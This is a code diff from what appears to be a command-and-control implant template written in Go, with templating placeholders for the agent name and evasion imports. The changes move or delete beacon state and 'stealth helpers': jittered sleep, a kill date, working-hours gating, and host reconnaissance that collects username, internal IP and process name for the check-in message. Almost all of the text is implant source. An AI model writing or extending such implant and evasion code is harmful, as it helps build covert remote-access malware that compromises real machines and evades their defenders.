@@ -11,27 +11,11 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
-	"sync"
-	"time"
 
 	"__NAME__/crypto"
 	"__NAME__/impl"
 	"__NAME__/protocol"
 	// __EVASION_MAIN_IMPORT__
-)
-
-// ─── Global state ──────────────────────────────────────────────────────────────
-
-var (
-	agent impl.AgentImpl
-	jobs  = impl.NewJobsController()
-
-	stateMu     sync.RWMutex
-	agentSleep  int   // seconds
-	agentJitter int   // 0-90 %
-	killDate    int64 // unix timestamp; 0 = disabled
-	workStart   int   // HHMM e.g. 900
-	workEnd     int   // HHMM e.g. 1700
 )
 
 // ─── Entry point ───────────────────────────────────────────────────────────────
@@ -75,16 +59,6 @@ func main() {
 		initProfileState(profile)
 		run(profile)
 	}
-}
-
-func initProfileState(p *protocol.Profile) {
-	stateMu.Lock()
-	defer stateMu.Unlock()
-	agentSleep = p.Sleep
-	agentJitter = p.Jitter
-	killDate = p.KillDate
-	workStart = p.WorkStart
-	workEnd = p.WorkEnd
 }
 
 // ─── Connection loop ───────────────────────────────────────────────────────────
@@ -210,23 +184,7 @@ func buildBeat(p *protocol.Profile) []byte {
 		username = os.Getenv("USERNAME")
 	}
 
-	internalIP := ""
-	if ifaces, err := net.Interfaces(); err == nil {
-		for _, iface := range ifaces {
-			if iface.Flags&net.FlagLoopback != 0 {
-				continue
-			}
-			if addrs, err := iface.Addrs(); err == nil {
-				for _, a := range addrs {
-					if ipNet, ok := a.(*net.IPNet); ok && ipNet.IP.To4() != nil {
-						internalIP = ipNet.IP.String()
-						goto doneIP
-					}
-				}
-			}
-		}
-	}
-doneIP:
+	internalIP := localIPv4()
 
 	w := protocol.NewWriterBE()
 
@@ -263,19 +221,6 @@ doneIP:
 	w.WriteBytes([]byte(processName()))        // Process
 
 	return w.Bytes()
-}
-
-func processName() string {
-	exe, err := os.Executable()
-	if err != nil {
-		return "__NAME__"
-	}
-	for i := len(exe) - 1; i >= 0; i-- {
-		if exe[i] == '/' || exe[i] == '\\' {
-			return exe[i+1:]
-		}
-	}
-	return exe
 }
 
 func encodeWorkingTime(start, end int) int {
@@ -326,60 +271,3 @@ func loadOsReleasePrettyName() string {
 
 // ─── Stealth helpers ───────────────────────────────────────────────────────────
 
-func sleepWithJitter() {
-	stateMu.RLock()
-	s := agentSleep
-	j := agentJitter
-	stateMu.RUnlock()
-
-	if s <= 0 {
-		s = 60
-	}
-	sleepMs := s * 1000
-	if j > 0 {
-		delta := int(float64(sleepMs) * float64(j) / 100.0)
-		sleepMs += int(rand.Int64N(int64(delta*2+1))) - delta
-		if sleepMs < 500 {
-			sleepMs = 500
-		}
-	}
-	time.Sleep(time.Duration(sleepMs) * time.Millisecond)
-}
-
-func shouldExit() bool {
-	stateMu.RLock()
-	kd := killDate
-	stateMu.RUnlock()
-	if kd == 0 {
-		return false
-	}
-	return time.Now().Unix() >= kd
-}
-
-func waitForWorkingHours() {
-	for {
-		stateMu.RLock()
-		ws := workStart
-		we := workEnd
-		stateMu.RUnlock()
-
-		if ws == 0 && we == 0 {
-			return
-		}
-
-		now := time.Now()
-		hhmm := now.Hour()*100 + now.Minute()
-
-		if ws <= we {
-			if hhmm >= ws && hhmm < we {
-				return
-			}
-		} else {
-			if hhmm >= ws || hhmm < we {
-				return
-			}
-		}
-
-		time.Sleep(60 * time.Second)
-	}
-}
